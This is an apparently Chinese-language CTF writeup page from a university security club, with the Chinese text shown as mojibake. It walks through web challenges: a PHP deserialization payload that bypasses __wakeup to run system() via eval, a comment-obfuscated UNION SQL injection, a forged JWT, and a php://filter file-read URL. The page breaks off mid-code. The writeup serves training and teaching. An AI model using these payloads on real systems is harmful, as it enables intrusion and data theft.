<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="WUSTç¬¬äºŒæ¬¡å†…éƒ¨èµ› Writeupï¼ˆå„¿ç«¥èŠ‚å¿«ä¹ï¼‰">
<meta property="og:type" content="article">
<meta property="og:title" content="WUSTå†…éƒ¨èµ›ï¼ˆå„¿ç«¥èŠ‚ï¼‰wp">
<meta property="og:url" content="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/index.html">
<meta property="og:site_name" content="WUST-AIS">
<meta property="og:description" content="WUSTç¬¬äºŒæ¬¡å†…éƒ¨èµ› Writeupï¼ˆå„¿ç«¥èŠ‚å¿«ä¹ï¼‰">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3S4JS.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3SqZq.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3SvJU.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3p9y9.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pie1.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pFdx.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pko6.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pEFK.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pVJO.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3psYT.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3p0wq.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pXnA.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png">
<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8saZV.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sdaT.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sDG4.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sHsI.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sBiF.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8swIU.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s5Je.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sIRH.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sozd.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s7QA.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8srRJ.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8ssz9.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s6MR.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sWdK.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sfIO.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8scs1.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sgqx.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sRZ6.png">
<meta property="article:published_time" content="2020-05-31T16:00:00.000Z">
<meta property="article:modified_time" content="2020-06-01T05:27:01.258Z">
<meta property="article:author" content="WUST-AIS">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/31/t3S4JS.png">

<link rel="canonical" href="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>WUSTå†…éƒ¨èµ›ï¼ˆå„¿ç«¥èŠ‚ï¼‰wp | WUST-AIS</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">WUST-AIS</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/logo.png">
      <meta itemprop="name" content="WUST-AIS">
      <meta itemprop="description" content="Join us">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WUST-AIS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WUSTå†…éƒ¨èµ›ï¼ˆå„¿ç«¥èŠ‚ï¼‰wp
        </h1>

        <div class="post-meta">
           
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-06-01 00:00:00 / Modified: 13:27:01" itemprop="dateCreated datePublished" datetime="2020-06-01T00:00:00+08:00">2020-06-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>WUSTç¬¬äºŒæ¬¡å†…éƒ¨èµ› Writeupï¼ˆå„¿ç«¥èŠ‚å¿«ä¹ï¼‰</p>
<a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><p>è®¿é—®é¡µé¢ï¼š</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3S4JS.png" alt="t3S4JS.png"></p>
<p>çŒœå¯†ç ï¼Œç¬¬ä¸€ååº”å°±æ˜¯çˆ†ç ´ï¼ŒæŸ¥çœ‹ä¸€ä¸‹Hint</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3SqZq.png" alt="t3SqZq.png"></p>
<p>4ä½çº¯æ•°å­—ï¼Œå¼€ä¸å¼€å¿ƒï¼Œé«˜ä¸é«˜å…´ï¼Œç›´æ¥çˆ†ç ´ï¼ˆæ‰‹åŠ¨è¾“å…¥ä¹Ÿè¡Œï¼Œæˆ‘æ²¡æ„è§ï¼‰</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3SvJU.png" alt="t3SvJU.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3p9y9.png" alt="t3p9y9.png"></p>
<p>1314ï¼Œè¾“å…¥è¿›å»ï¼Œæ‹¿åˆ°flag</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3pie1.png" alt="t3pie1.png"></p>
<h3 id="æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶"><a href="#æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶" class="headerlink" title="æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶"></a>æˆ‘å·²å¤‡ä»½å¥½æ–‡ä»¶</h3><blockquote>
<p>æ ¹æ®ä¸Šæ¬¡çš„åé¦ˆï¼Œå› æ­¤ç‰¹åœ°åŠ äº†è¿™é“é€åˆ†é¢˜ã€‚</p>
</blockquote>
<p>é¢˜ç›®è¯´å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°æ˜¯phpï¼Œé‚£å°±å°è¯•å¸¸è§çš„æºç æ³„éœ²çš„ç‚¹ï¼Œå¯ä»¥å‚è€ƒåä¼š <code>wiki</code> å¦ä¸€ç¯‡æ–‡ç« çš„ç‚¹ï¼š<code>https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/#å¤‡ä»½æ–‡ä»¶æºç æ³„æ¼</code></p>
<p>è®¿é—® <code>index.php.bak</code> æ‹¿åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">./flag.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Enjoy;</span><br><span class="line">	<span class="keyword">public</span> $Happy;</span><br><span class="line">	<span class="keyword">public</span> $keyboard;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($value1,$value2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Enjoy = $value1;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Happy = $value2;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="comment">#</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'happy'</span>]))&#123;</span><br><span class="line">	unserialize($_POST[<span class="string">'happy'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œç»•è¿‡ <code>__wakeup()</code> å°±å¥½äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Enjoy;</span><br><span class="line">	<span class="keyword">public</span> $Happy;</span><br><span class="line">	<span class="keyword">public</span> $keyboard;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HaveFun();</span><br><span class="line">$a-&gt;keyboard = <span class="string">"system('cat ./flag.php');"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:7:"HaveFun":3:&#123;s:5:"Enjoy";N;s:5:"Happy";N;s:8:"keyboard";s:25:"system('cat ./flag.php');";&#125;</span></span><br></pre></td></tr></table></figure>

<p>æ¼æ´åŸç†ï¼šå½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå…¶çœŸå®å€¼(è¿™é‡Œ&gt;3)ï¼Œåˆ™è·³è¿‡ <code>__wakeup()</code> æ‰§è¡Œã€‚</p>
<p><code>O:7:&quot;HaveFun&quot;:4:{s:5:&quot;Enjoy&quot;;N;s:5:&quot;Happy&quot;;N;s:8:&quot;keyboard&quot;;s:25:&quot;system(&#39;cat ./flag.php&#39;);&quot;;}</code></p>
<p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>ä¼ å‚ï¼Œæ‹¿åˆ°flag</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3pFdx.png" alt="t3pFdx.png"></p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p>
<p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6835592.html</a></p>
<h3 id="æœ‰ç‚¹åƒç”œé¥¼"><a href="#æœ‰ç‚¹åƒç”œé¥¼" class="headerlink" title="æœ‰ç‚¹åƒç”œé¥¼"></a>æœ‰ç‚¹åƒç”œé¥¼</h3><p><img src="https://s1.ax1x.com/2020/05/31/t3pko6.png" alt="t3pko6.png"></p>
<p>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéšä¾¿è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œä¼šå‘ç°é¡µé¢æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œçœ‹ä¸€ä¸‹Hint</p>
<p>æç¤ºè¯´adminï¼šé‚£å°±adminè¿›å»</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3pEFK.png" alt="t3pEFK.png"></p>
<p>è¿”å›è¿™æ ·ï¼Œå¯†ç æ”¹ä¸º2ï¼Œä¼šå‘ç°æœ‰ä¸€ç‚¹ä¸åŒçš„å›æ˜¾ï¼›</p>
<p>çœ‹çœ‹cookieï¼š</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3pVJO.png" alt="t3pVJO.png"></p>
<p>è¿™ä¸€çœ‹å°±æ˜¯JWTï¼Œä¸ç”¨æƒ³äº†ï¼Œæ‰¾key</p>
<p>ç™»å½•æ¡†èƒ½æœ‰ä»€ä¹ˆæ¼æ´ï¼Œæµ‹è¯•ä¸€ä¸‹sqlæ³¨å…¥ï¼Œå‘ç°å¯†ç æ¡†å­˜åœ¨æ³¨å…¥ç‚¹ï¼›</p>
<p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¼•å·ï¼ˆç›²çŒœæ•°å­—å‹è¾“å…¥ï¼Œå› ä¸ºè¿‡æ»¤äº†å¼•å·å˜›ï¼‰</p>
<p>å¸¸è§„çš„unionæ³¨å…¥å³å¯ï¼Œå°†ç©ºæ ¼æ¢æˆ/**/å³å¯ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;passwd&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(hint_key)&#x2F;**&#x2F;from&#x2F;**&#x2F;hint)#</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/05/31/t3psYT.png" alt="t3psYT.png"></p>
<p>æ‹¿åˆ°å¯†é’¥å» <code>https://jwt.io/</code> è¿›è¡Œæ›´æ”¹ï¼Œç„¶å cookie ä¼ªé€ ä¸€ä¸‹ï¼Œæ‹¿åˆ° flagï¼š</p>
<p><img src="https://s1.ax1x.com/2020/05/31/t3p0wq.png" alt="t3p0wq.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9uIjoidHJ1ZSJ9.Ze4cQbeD2BMP9S5CmidQ6UrszaRBlm7aaR7opHh_nzk</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/05/31/t3pXnA.png" alt="t3pXnA.png"></p>
<p>å¦å¤–è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸè§£ï¼Œç”±äºå‡ºé¢˜äººçš„ç–å¿½ï¼Œé¢˜ç›®ç¯å¢ƒè‡ªå¸¦çš„ <code>phpmyadmin</code> å¹¶æ²¡æœ‰å¤„ç†æ‰ï¼Œç›´æ¥è¿›å…¥ <code>phpmyadmin</code> ç”¨åˆå§‹å¯†ç ç™»é™†å°±èƒ½ç›´æ¥çœ‹æ•°æ®åº“äº†ã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png" alt="image-20200601010515131"></p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://www.freebuf.com/column/170359.html" target="_blank" rel="noopener">https://www.freebuf.com/column/170359.html</a></p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><blockquote>
<p>Author: è¿™é“é¢˜ç›®å‡ºç€æ˜¯æƒ³ç†è§£ä¸€ä¸‹æ¸—é€çš„æµç¨‹ï¼Œç®—æ¯”è¾ƒç”¨å¿ƒåœ°å»å‡ºé¢˜ï¼Œæ¯”è¾ƒé—æ†¾ï¼Œå› ä¸ºä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´æ²¡æœ‰äººè§£å‡ºæ¥ï¼Œå‡†å¤‡äº†å¾ˆå¤š <code>hint</code>ï¼Œä½†æ„Ÿè§‰å‰é¢æ²¡åšåˆ°ï¼Œåé¢çš„æç¤ºå¥½åƒä¹Ÿæ´¾ä¸ä¸Šç”¨åœºï¼Œçµæ„Ÿæ¥è‡ªç©ºæŒ‡é’ˆçš„ä¸€æ¬¡å†…éƒ¨èµ›ï¼Œé‚£ä¸ªæ¯”è¾ƒéš¾ã€‚è¿™æ¬¡ä¸»è¦è€ƒç‚¹è¿˜æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ (å†…éƒ¨è®­ç»ƒ)ï¼Œåé¢çš„æ¸—é€æ¯”è¾ƒåˆ»æ„åœ°å»è®¾ç½®ï¼Œä¹Ÿä¸ç®—å¤ªéš¾ï¼Œè¿‡äº†æ–‡ä»¶ä¸Šä¼ æœ‰ <code>hint</code> éƒ½å¯ä»¥ç§’è§£ï¼Œé¢˜ç›®æ¯”è¾ƒè´´å¿ƒåœ°ç»™ä½ å‡†å¤‡å¥½äº†ä¸€åˆ‡ï¼Œéƒ½æ˜¯åŸºæœ¬æ“ä½œï¼Œä¸»è¦æ˜¯æƒ³ç†Ÿæ‚‰ <code>nmap</code> çš„åŸºæœ¬ä½¿ç”¨åŠå†…ç½‘æ¢æµ‹ä¸çˆ†ç ´ã€‚</p>
</blockquote>
<p>æ‰“å¼€ç½‘é¡µï¼Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ å›¾ç‰‡ï¼Œä¼šå°†å›¾ç‰‡æ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶åå‡ºç°äº†ä¸¤ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå­˜åœ¨çš„ä¸œè¥¿ï¼šä¸¤é¦–æ­Œçš„æ­Œè¯ï¼Œæ³¨æ„åˆ° <code>url</code> å‘ç°æœ‰æ–‡ä»¶åŒ…å«ï¼Œ<code>http://47.110.130.169:10001/view.php?article=song.php</code>ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥åŒ…å«æ–‡ä»¶ğŸï¼Œä½†åŒæ—¶ä¹Ÿå¯ä»¥ç”¨ä¼ªåè®®è¯»æºç (è¿™é‡Œæ²¡æœ‰è¿‡æ»¤)ï¼Œæç¤º <code>flag</code> åœ¨ <code>/flag</code>ï¼Œå¦‚æœçœŸçš„åœ¨ï¼Œé‚£ä¹ˆä¼ªåè®®å°±èƒ½è¯» <code>flag</code> äº†ï¼Œè¿™é¢˜å°±ä¸ç”¨åšäº†ã€‚</p>
<p><code>http://47.110.130.169:10001/view.php?article=php://filter/convert.Base64-encode/resource=index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Can you bypass?&lt;/title&gt;</span><br><span class="line">I have already give you shell, this challenge is too easy.</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=<span class="string">"/index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upload_file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"æäº¤"</span>&gt;</span><br><span 